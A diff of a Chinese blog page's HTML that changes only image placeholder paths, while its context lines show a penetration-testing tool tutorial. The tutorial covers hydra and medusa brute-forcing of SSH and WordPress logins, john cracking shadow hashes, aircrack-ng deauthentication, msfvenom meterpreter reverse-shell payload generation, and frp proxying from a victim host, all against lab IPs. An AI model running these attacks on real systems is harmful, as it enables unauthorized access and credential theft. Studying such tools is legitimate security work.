@@ -585,7 +585,7 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">123456<br>000000<br>abc123<br>tian<br></code></pre></td></tr></table></figure>
 
 <p>攻击结果:</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/8f9ef3fa904e4ecdbc3f65faba1a9205.png" srcset="/img/loading.gif" lazyload alt="image-20220522183053265"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/8f9ef3fa904e4ecdbc3f65faba1a9205.png" srcset="/img/common/loading.gif" lazyload alt="image-20220522183053265"></p>
 <h2 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h2><h2 id="五、密码攻击"><a href="#五、密码攻击" class="headerlink" title="五、密码攻击"></a>五、密码攻击</h2><h3 id="1、hydra"><a href="#1、hydra" class="headerlink" title="1、hydra"></a>1、hydra</h3><p><strong>用法：</strong></p>
 <figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs inform7">格式：hydra <span class="hljs-comment">[<span class="hljs-comment">[<span class="hljs-comment">[-l LOGIN|-L FILE]</span> <span class="hljs-comment">[-p PASS|-P FILE]</span>]</span> | <span class="hljs-comment">[-C FILE]</span>]</span> <span class="hljs-comment">[-e ns]</span><br><span class="hljs-comment">[-o FILE]</span> <span class="hljs-comment">[-t TASKS]</span> <span class="hljs-comment">[-M FILE <span class="hljs-comment">[-T TASKS]</span>]</span> <span class="hljs-comment">[-w TIME]</span> <span class="hljs-comment">[-f]</span> <span class="hljs-comment">[-s PORT]</span> <span class="hljs-comment">[-S]</span> <span class="hljs-comment">[-vV]</span><br>server service <span class="hljs-comment">[OPT]</span><br>-R 继续从上一次进度接着破解<br>-S 大写，采用SSL链接<br>-s &lt;PORT&gt; 小写，可通过这个参数指定非默认端口<br>-l &lt;LOGIN&gt;<br>指定破解的用户，对特定用户破解<br>-L &lt;FILE&gt; 指定用户名字典<br>-p &lt;PASS&gt; 小写，指定密码破解，少用，一般是采用密码字典<br>-P &lt;FILE&gt; 大写，指定密码字典<br>-e &lt;ns&gt; 可选选项，n：空密码试探，s：使用指定用户和密码试探<br>-C &lt;FILE&gt; 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数<br>-M &lt;FILE&gt; 指定目标列表文件一行一条<br>-o &lt;FILE&gt; 指定结果输出文件<br>-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解<br>-t &lt;TASKS&gt; 同时运行的线程数，默认为16<br>-w &lt;TIME&gt; 设置最大超时的时间，单位秒，默认是30s<br>-v / -V 显示详细过程<br><br>server<br>目标ip<br><br>service<br>指定服务名，支持的服务和协议：telnet ftp pop3<span class="hljs-comment">[-ntlm]</span> imap<span class="hljs-comment">[-ntlm]</span> smb smbnt http<span class="hljs-comment">[s]</span>-&#123;head|get&#125; http-&#123;get|post&#125;-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth<span class="hljs-comment">[-ntlm]</span> pcanywhere teamspeak sip vmauthd firebird ncp afp等等<br><br>OPT<br>可选项<br></code></pre></td></tr></table></figure>
 
@@ -593,7 +593,7 @@
 <p>密码破解</p>
 <figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tcl">hydra -L <span class="hljs-keyword">dict</span>.txt -P <span class="hljs-keyword">dict</span>.txt <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.119</span> <span class="hljs-keyword">http</span>-get /webdav<br><span class="hljs-comment"># http-get为协议</span><br><span class="hljs-comment"># /webdav为目录</span><br></code></pre></td></tr></table></figure>
 
-<p>破解成功<img src="https://s2.loli.net/2022/01/11/VvWhR3g6ptaZozn.png" srcset="/img/loading.gif" lazyload alt="image-20220110225241143"></p>
+<p>破解成功<img src="https://s2.loli.net/2022/01/11/VvWhR3g6ptaZozn.png" srcset="/img/common/loading.gif" lazyload alt="image-20220110225241143"></p>
 <figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">hydra -L dict.txt -P dict.txt -vV -f </span><span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.120</span><span class="language-xml"> http-post-form &quot;/wordpress/wp-login.php:user_login=</span><span class="hljs-keyword">^USER</span><span class="language-xml">^&amp;user_pass=</span><span class="hljs-keyword">^PASS</span><span class="hljs-keyword">^:login_error</span><span class="language-xml">&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">-f 找到一个结果后停止</span><br><span class="language-xml">-vV显示详细过程</span><br><span class="language-xml">&quot;/wordpress/wp-login.php:user_login=</span><span class="hljs-keyword">^USER</span><span class="language-xml">^&amp;user_pass=</span><span class="hljs-keyword">^PASS</span><span class="hljs-keyword">^:login_error</span><span class="language-xml">&quot;是由冒号分隔三个部分，第一个部分是登录页面所在目录，第二部分user_login=</span><span class="hljs-keyword">^USER</span><span class="language-xml">^&amp;user_pass=</span><span class="hljs-keyword">^PASS</span><span class="language-xml">^，这是POST提交表单中id的名字，把用户名和密码部分换成了</span><span class="hljs-keyword">^USER</span><span class="language-xml">^和</span><span class="hljs-keyword">^PASS</span><span class="language-xml">^。USER对应前面的-L，PASS对应-P。最后一部分login_error是指定的判断密码是否正确的条件，默认是黑名单模式，也就是如果返回页面中存在&quot;login_error&quot;(提交错误后查看错误信息对应源码)就说明这个密码不正确。user_login、user_pass、login_error这三个内容要根据页面中源码里的id的值进行修改。</span><br></code></pre></td></tr></table></figure>
 
 
@@ -608,7 +608,7 @@
 <p><strong>默认用法</strong></p>
 <figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># 爬行指定url,输出单词列表</span><br>cewl <span class="hljs-variable">&lt;url&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/nkwNKt9XeM3RFyx.png" srcset="/img/loading.gif" lazyload alt="image-20220110224446486"></p>
+<p><img src="https://s2.loli.net/2022/01/11/nkwNKt9XeM3RFyx.png" srcset="/img/common/loading.gif" lazyload alt="image-20220110224446486"></p>
 <p><strong>cewl认证登录</strong></p>
 <figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">cewl</span> &lt;<span class="hljs-comment">url</span>&gt; <span class="hljs-literal">--</span><span class="hljs-comment">auth_type Digest</span> <span class="hljs-literal">--</span><span class="hljs-comment">auth_user admin</span> <span class="hljs-literal">--</span><span class="hljs-comment">auth_pass password</span> <span class="hljs-literal">-</span><span class="hljs-comment">v</span><br><span class="hljs-comment">或</span><br><span class="hljs-comment">cewl</span> &lt;<span class="hljs-comment">url</span>&gt; <span class="hljs-literal">--</span><span class="hljs-comment">auth_type basic</span> <span class="hljs-literal">--</span><span class="hljs-comment">auth_user admin</span> <span class="hljs-literal">--</span><span class="hljs-comment">auth_pass password</span> <span class="hljs-literal">-</span><span class="hljs-comment">v</span><br></code></pre></td></tr></table></figure>
 
@@ -623,13 +623,13 @@
 <p><strong>示例：</strong></p>
 <p>暴力破解登陆密码：</p>
 <p>查看&#x2F;ect&#x2F;shadow文件，发现hacksudo密码密文</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/a949520f07ad48a18e958d1ca315b65f.png" srcset="/img/loading.gif" lazyload alt="image-20220203180352466"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/a949520f07ad48a18e958d1ca315b65f.png" srcset="/img/common/loading.gif" lazyload alt="image-20220203180352466"></p>
 <p>创建一个文件hash.txt，放密文拷贝到hash.txt中</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/42bc5107fb3846b2b8b573ad8856f5d5.png" srcset="/img/loading.gif" lazyload alt="image-20220203180838402"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/42bc5107fb3846b2b8b573ad8856f5d5.png" srcset="/img/common/loading.gif" lazyload alt="image-20220203180838402"></p>
 <p>使用命令john hash.txt破解密码</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/c6a54542a14b486fa5be59dff2ff00f5.png" srcset="/img/loading.gif" lazyload alt="image-20220203180921499"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/c6a54542a14b486fa5be59dff2ff00f5.png" srcset="/img/common/loading.gif" lazyload alt="image-20220203180921499"></p>
 <p>使用命令john -show hash.txt查看破解到的密码，发现用户hacksudo的密码为aliens</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/95311c715db449c6bad42b6c5200108a.png" srcset="/img/loading.gif" lazyload alt="image-20220203180952064"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/95311c715db449c6bad42b6c5200108a.png" srcset="/img/common/loading.gif" lazyload alt="image-20220203180952064"></p>
 <h3 id="4、medusa"><a href="#4、medusa" class="headerlink" title="4、medusa"></a>4、medusa</h3><p><strong>功能：</strong></p>
 <p>medusa是一款开源的暴力破解工具，支持多种协议的密码破解。</p>
 <p><strong>用法：</strong></p>
@@ -639,7 +639,7 @@
 <p>已知用户民，破解ssh密码</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">medusa</span> -u missyred -P /usr/share/wordlists/rockyou.txt -h <span class="hljs-number">10.35.153.37</span> -M ssh -f -t <span class="hljs-number">5</span> <br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/e5618ae82d744051b9641d82cb748bac.png" srcset="/img/loading.gif" lazyload alt="image-20220920231455392"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/e5618ae82d744051b9641d82cb748bac.png" srcset="/img/common/loading.gif" lazyload alt="image-20220920231455392"></p>
 <h2 id="六、无线攻击"><a href="#六、无线攻击" class="headerlink" title="六、无线攻击"></a>六、无线攻击</h2><h3 id="1-Aircrack-ng无线套装"><a href="#1-Aircrack-ng无线套装" class="headerlink" title="1.Aircrack-ng无线套装"></a>1.Aircrack-ng无线套装</h3><p>Aircrack-ng（注意大小写，aircrack-ng是Aircrack-ng中的一个组件）是一个包含了多款工具的无线攻击审计套装，这里面很多工具在后面的内容中都会用到，具体见下表为Aircrack-ng包含的组件具体列表。</p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9ee0a590dee7">aircrack-ng原理解析</a></p>
 <table>
@@ -700,22 +700,22 @@
 <p><strong>查看网卡基本信息</strong></p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">iwconfig</span> wlan0<br>或iw dev<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/fbf6048e2dc0427db13843145e813a52.png" srcset="/img/loading.gif" lazyload alt="image-20220118103303988"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/fbf6048e2dc0427db13843145e813a52.png" srcset="/img/common/loading.gif" lazyload alt="image-20220118103303988"></p>
 <p>若未显示wifi,可在正常的模式下用这个命令扫描wifi，然后再开启airmon-ng开始命令进来就有了，如果还未显示有可能是网卡不支持监听模式，另外还需要注意的是部分网卡对usb3.0存在不兼容现象，可更换2.0端口即可</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 查看无线网卡配置信息，查看支持接口模式</span><br><span class="hljs-attribute">iw</span> list<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/55c9029db9614e79848f9bf55cc7e844.png" srcset="/img/loading.gif" lazyload alt="image-20220117152020306"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/55c9029db9614e79848f9bf55cc7e844.png" srcset="/img/common/loading.gif" lazyload alt="image-20220117152020306"></p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 查看信道</span><br><span class="hljs-attribute">iwlist</span> wlan0 frequency<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/b806b123a73640b78438daec9cd6d647.png" srcset="/img/loading.gif" lazyload alt="image-20220117152144116"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/b806b123a73640b78438daec9cd6d647.png" srcset="/img/common/loading.gif" lazyload alt="image-20220117152144116"></p>
 <p><strong>Deauth攻击</strong></p>
 <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment"># 设置网卡为混杂模式</span><br>airmon-ng start wlan0<br>或<br>ifconfig wlan0 down<br>iwconfig wlan0 mode<span class="hljs-built_in"> monitor</span><br><span class="hljs-built_in"></span><span class="hljs-comment">#iwconfig wlan0 mode managed</span><br>iw dev查看状态<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/06cf72bee70b47edbc1bc1a9631fdfa2.png" srcset="/img/loading.gif" lazyload alt="image-20220118104200947"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/06cf72bee70b47edbc1bc1a9631fdfa2.png" srcset="/img/common/loading.gif" lazyload alt="image-20220118104200947"></p>
 <p>可以看到开启混杂模式，并且重命名为wlan0mon</p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 对当前无线网络进行嗅探</span><br>airodump<span class="hljs-punctuation">-</span>ng wlan0<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/c16f47a91be14834a5aac5cc81dd8f71.png" srcset="/img/loading.gif" lazyload alt="image-20220118103828010"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/c16f47a91be14834a5aac5cc81dd8f71.png" srcset="/img/common/loading.gif" lazyload alt="image-20220118103828010"></p>
 <p>使用aircrack-ng进行取消认证攻击</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aireplay</span>-ng -<span class="hljs-number">0</span> &lt;num&gt; -a &lt;BSSID&gt; -c &lt;aim_mac&gt; &lt;interface&gt;<br><span class="hljs-attribute">aireplay</span>-ng -<span class="hljs-number">0</span> <span class="hljs-number">0</span> -a B0:<span class="hljs-number">95</span>:<span class="hljs-number">8</span>E:<span class="hljs-number">28</span>:<span class="hljs-number">0</span>E:<span class="hljs-number">25</span> wlan0<br></code></pre></td></tr></table></figure>
 
@@ -739,7 +739,7 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br></code></pre></td></tr></table></figure>
 
 <p>Stage类型payload为分阶段传递payload，payload本身无法反弹shell，当执行payload（即图中shellcode）时，会请求服务器上的第二阶段payload（即图中metsrv），此时Payload就能够反弹Shell，当metsrv传输成功之后，shellcode就会把控制权转给metsrv，metsrv这时再去请求另外两个dll文件stdapi和priv。值得注意的是，Stage型Payload<strong>只能用msf的exploit&#x2F;multi&#x2F;handler模块进行连接</strong>，无法使用nc直接连接。</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/2823e31dbd3a4a798c3041f0be91362b.png" srcset="/img/loading.gif" lazyload alt="image-20220714205301808"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/2823e31dbd3a4a798c3041f0be91362b.png" srcset="/img/common/loading.gif" lazyload alt="image-20220714205301808"></p>
 <p><strong>Stageless类型Payload</strong></p>
 <p>不分阶段的payload，在生成时已经包含反弹shell所需要metsrv组件，一般体积较大，默认的stageless payload只会包含stageless，所以如果想将stdapi和priv两个组建给包含进去的华我们可以用extensions命令：</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.56.105 <span class="hljs-attribute">LPORT</span>=6666 <span class="hljs-attribute">EXTENSIONS</span>=stdapi,priv -f exe -o stageless.exe<br></code></pre></td></tr></table></figure>
@@ -792,17 +792,17 @@
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_ip</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">56.105</span>   <span class="hljs-comment">#kali IP，为与客户端绑定的进行通讯的地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure>
 
 <p>前台启动：<code>./frps -c ./frps.ini</code> 后台启动：<code>nohup ./frps -c ./frps.ini &amp;</code></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/ea340d344bab4c3f9777e2bba7720243.png" srcset="/img/loading.gif" lazyload alt="image-20220517115911129"><strong>客户端：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/ea340d344bab4c3f9777e2bba7720243.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517115911129"><strong>客户端：</strong></p>
 <p>在受害机运行客户端frc，frpc.ini配置文件为</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">56.105</span> <span class="hljs-comment">#服务端的IP地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>           <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks_proxy]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> =<span class="hljs-number">8888</span>            <span class="hljs-comment">#socks端口</span><br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure>
 
 <p>前台启动：<code>./frpc -c ./frpc.ini</code> 后台启动：<code>nohup ./frpc -c ./frpc.ini &amp;</code></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/51df6148fe744ea397ec4743c4fb9f63.png" srcset="/img/loading.gif" lazyload alt="image-20220517121046202"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/51df6148fe744ea397ec4743c4fb9f63.png" srcset="/img/common/loading.gif" lazyload alt="image-20220517121046202"></p>
 <p><strong>二层代理使用</strong></p>
 <p><strong>网络拓扑:</strong></p>
 <p>攻击机:kali(192.168.56.105)</p>
 <p>受害者:ubuntu20(192.168.56.133)</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/ff27df32fabe4176a7d3a03c064b1e77.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/ff27df32fabe4176a7d3a03c064b1e77.png" srcset="/img/common/loading.gif" lazyload alt="图片"></p>
 <h3 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h3><p><a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">GitHub</a></p>
 <p>常用命令选项</p>
 <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fw - 使用通配符结果强制处理域。</span><br><span class="hljs-deletion">-np - 隐藏进度输出。</span><br><span class="hljs-deletion">-m &lt;mode&gt;- 使用哪种模式，dir或者dns（默认:) dir。</span><br><span class="hljs-deletion">-q - 禁用横幅/下划线输出。</span><br><span class="hljs-deletion">-t &lt;threads&gt;- 要运行的线程数（默认值:) 10。</span><br><span class="hljs-deletion">-u &lt;url/domain&gt; - 完整URL（包括方案）或基本域名。</span><br><span class="hljs-deletion">-v - 详细输出（显示所有结果）。</span><br><span class="hljs-deletion">-w &lt;wordlist&gt;- 用于暴力强制的wordlist的路径（-用于stdin）。</span><br></code></pre></td></tr></table></figure>
@@ -816,7 +816,7 @@
 <p><strong>示例</strong></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster dir -u https:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.106</span><span class="hljs-regexp">/chatbot/</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>directory-list-<span class="hljs-number">2.3</span>-medium.txt -x php,html,txt -k<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/95b693b083154a2ea25eb079bf35e1ff.png" srcset="/img/loading.gif" lazyload alt="image-20220319205815092"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/95b693b083154a2ea25eb079bf35e1ff.png" srcset="/img/common/loading.gif" lazyload alt="image-20220319205815092"></p>
 <h3 id="魔术hash"><a href="#魔术hash" class="headerlink" title="魔术hash"></a>魔术hash</h3><p>常用hash文件</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/spaze/hashes">hashes</a></p>
 <h3 id="HOST碰撞工具"><a href="#HOST碰撞工具" class="headerlink" title="HOST碰撞工具"></a>HOST碰撞工具</h3><p><strong>介绍</strong></p>
